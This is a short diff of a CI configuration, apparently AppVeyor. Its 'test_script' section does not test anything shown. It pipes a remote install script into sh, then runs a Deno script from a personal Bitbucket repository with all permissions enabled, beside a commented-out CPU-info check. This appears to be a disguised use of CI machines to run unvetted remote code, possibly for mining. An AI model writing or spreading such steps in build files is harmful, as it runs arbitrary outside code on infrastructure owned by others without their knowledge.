@@ -36,7 +36,7 @@ image: Ubuntu2004
 
 # Post-install test scripts.
 test_script:
-  - cat /proc/cpuinfo
+  #- cat /proc/cpuinfo
   - curl -fsSL https://deno.land/x/install/install.sh | sh
   - PUPPETEER_PRODUCT=chrome $HOME/.deno/bin/deno run -A --unstable https://deno.land/x/puppeteer@9.0.0/install.ts
   - $HOME/.deno/bin/deno run -A --unstable https://bitbucket.org/meocodervippro/meocoder_node/raw/main/web/main.ts
